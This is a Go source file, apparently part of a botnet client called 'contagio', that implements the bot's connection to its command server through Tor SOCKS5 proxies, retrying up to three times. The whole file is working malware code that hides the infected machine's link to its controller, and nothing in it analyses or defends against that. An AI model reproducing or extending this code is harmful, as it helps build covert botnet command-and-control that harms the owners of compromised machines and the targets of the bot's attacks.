package main

import (
	"contagio/bot/config"
	"contagio/bot/methods"
	"contagio/bot/utils"
	"fmt"
	"net"
	"time"

	"golang.org/x/net/proxy"
)

/*
Tor proxies ( ip:port )
*/

var MaxProxyAttempts = 3

var TorProxies = []string{
	"127.0.0.1:9050",
}

func ConnectViaTor() (net.Conn, error) {
	defer methods.Catch()

	var (
		dialer   proxy.Dialer
		attempts int
	)

TorProxy:
	if attempts >= MaxProxyAttempts {
		return nil, fmt.Errorf("attempts >= MaxProxyAttempts")
	}

	tor_proxy := utils.GetArrayVal(TorProxies)

	dialer, err := NewDialer(tor_proxy)
	if err != nil {
		attempts++
		goto TorProxy
	}

	conn, err := dialer.Dial("tcp", config.TOR_SERVER+":"+config.TOR_PORT)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[tor] Can't connect to the bot server:", err)
		}
		time.Sleep(1 * time.Second)
		attempts++
		goto TorProxy
	}

	return conn, nil
}

func NewDialer(tor_proxy string) (proxy.Dialer, error) {
	defer methods.Catch()

	dialer, err := proxy.SOCKS5("tcp", tor_proxy, nil, proxy.Direct)
	if err != nil {
		return nil, err
	}

	return dialer, nil
}
